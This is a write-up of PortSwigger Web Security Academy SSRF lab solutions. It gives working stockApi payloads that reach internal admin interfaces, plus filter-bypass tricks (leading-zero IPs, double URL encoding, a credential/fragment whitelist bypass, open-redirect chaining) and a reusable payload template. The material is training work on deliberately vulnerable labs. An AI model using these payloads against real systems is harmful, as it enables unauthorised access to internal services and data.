https://portswigger.net/web-security/ssrf


# 1. Lab: Basic SSRF against the local server
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

Goal:
access the admin interface at http://localhost/admin and delete carlos

original query:
```htm
POST /product/stock HTTP/1.1
Host: ac3f1f371fca19aac066a754004e005a.web-security-academy.net
...

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D4%26storeId%3D1
```

payload 1:
stockApi=http://localhost/admin
response:
```htm
<h1>Users</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
```
payload 2:
stockApi=http://localhost/admin/delete?username=carlos

**deleted**!


# 2. Lab: Basic SSRF against another back-end system
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system\

to solve the lab:

scan 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 

request the same vulnarbility as in lab 1:

```htm
POST /product/stock HTTP/1.1
Host: 065406a7304f37e005aca19aacacf11f.web-security-academy.net
...

stockApi=http://192.168.0.1/admin
```

response: 

```htm
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 102

"Invalid external stock check url 'Illegal character in path at index 24: http://192.168.0.1/admin
'"
```

lets send it to intruder:

using Numbers type for payload:

0 to 255


response:

(many 400 status code, waiting for 200 status code...burp comunity is taking forever! lets code a simple script to scan range 192.168.0.x:


(https://github.com/n1njaZ0Z/Labs_Portswigger/blob/main/SSRF/Lab:%20Basic%20SSRF%20against%20another%20back-end%20system.py)

once we have the port we can send the final request:
```htm
POST /product/stock HTTP/1.1
Host: 065406a7304f37e005aca19aacacf11f.web-security-academy.net
...

stockApi=http://192.168.0.1/admin/delete?username=carlos
```
**deleted**!


# 3. Lab: SSRF with blacklist-based input filter
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter


like prevoius lab we need access to http://localhost/admin to delet carlos - but it is being blocked by a waf system. we need to bypass waf with obfuscation 

(check methods online: https://portswigger.net/web-security/reference/obfuscating-attacks-using-encodings)

obfuscated methods:
1. **127.0.0.01** - Bypassing blacklist of "127.0.0.1" with leading zero
2. **%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65** - Double encoding the word "admin"

final payload:
```htm
http://127.0.0.01/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

```
we got admin panel! 

lets use it again with the 'delete user' link found in admin page:

/admin/delete?username=carlos


```htm
http://127.0.0.01/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos

```
**deleted!**


# 4. Lab: SSRF with whitelist-based input filter
https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

Goal:
access the admin interface at http://localhost/admin and delete carlos

problem: white list of "stock.weliketoshop.net" site:
solution: 
1. bypass whitelist
2. inject payload

bypass: finding a payload that will be parsed diffrently on the waf engine and in the server parser, to our advantage:

**stage 1 planning payload structure:**

http://username@weliketoshop.net // 500 whitelist approved. server supports credentials so waf approve different string in the start
http://username#@weliketoshop.net  // 400 whitelist denied - suggets waf treats part before # as url and after as fragment
http://username%23@weliktoshop.net // 400 urlencode # to %23 - still denied (waf smart to check for urlencoding)
http://username%2523@weliktoshop.net // 500 double encode # to %2523 - whitelist approved (waf not smart to check for double urlencoding) but server does double decode and treats %2523 as # 

**we have a method to sneak our payload through the waf whitelist!**



**stage 2. crafting the payload:** 

conecting to the local host to delete a user:

http://localhost%2523@weliketoshop.net // 200 server response to our payload - application exist and listening
http://localhost%2523@stock.weliketoshop.net/admin // 200 server provides access to priviliged page alowing accsses to limited actions:
http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos // 302 successfuly deleted carlos

**lab solved**

# **payload structure:**
**{protocol}{payload}%2523{whitelisted.site}**

{protocol} = **http://**

{payload} =
1. **localhost** - pointing the server to itself
2. **\#** - double encoded into "%2523" to fool waf
3. **@** - if acccepted => indicates URL parser supports embedded credentials (to connect to a username in the system)
4. **stock.weliketoshop.net**  - the site approved by a whitelist
5. **/admin/delete?username=carlos** - our actual command 




**how waf parse it:**

1. **username:** localhost%23

2. **white listed approved url:** stock.weliketoshop.net/admin/delete?username=carlos



**how server parse it:**

1. **url:** localhost

2. **url fragment(ignored):** #@stock.weliketoshop.net

3. **url subdirectories:** /admin/delete?username=carlos  (according to RFC 3986 path section starts with the **/**  char)


**suggested materials:**

A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! 

Orange Tsai's talk at: https://www.youtube.com/watch?v=voTHFdL9S2k
<!-- 
not relevant to this drill but still cool: ["ss", "SS"].indexOf("ß") = False -->

#


# **5. SSRF with filter bypass via open redirection vulnerability**
https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection


To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. 

**construct the payload:**

1. click on stock to get baseline messege:
**stockApi=/product/stock/check?productId=1&storeId=1** (after urldecoded) 

this will be the injection point: **stockApi=**


2. click on Next product to get the redirection syntax:

**GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1**

 now we have redirecting syntax **/product/nextProduct?currentProductId=1&path=** (no need for the **/product?productId=** we will replace them with our path)

3. Admin Adress from Lab description


**craft the payload:**

use injection point {1} with the redirection syntax {2} and the admin panel address {3} from lab description:

**{stockApi=}{/product/nextProduct?currentProductId=1%26path=}{http[:]192.168.0.12:8080/admin/delete?username=carlos}**




# 6. Lab: SSRF via flawed request parsing
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing

will be completed with burp pro

# 7. Host validation bypass via connection state attack
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack

reading material: https://portswigger.net/research/browser-powered-desync-attacks#state
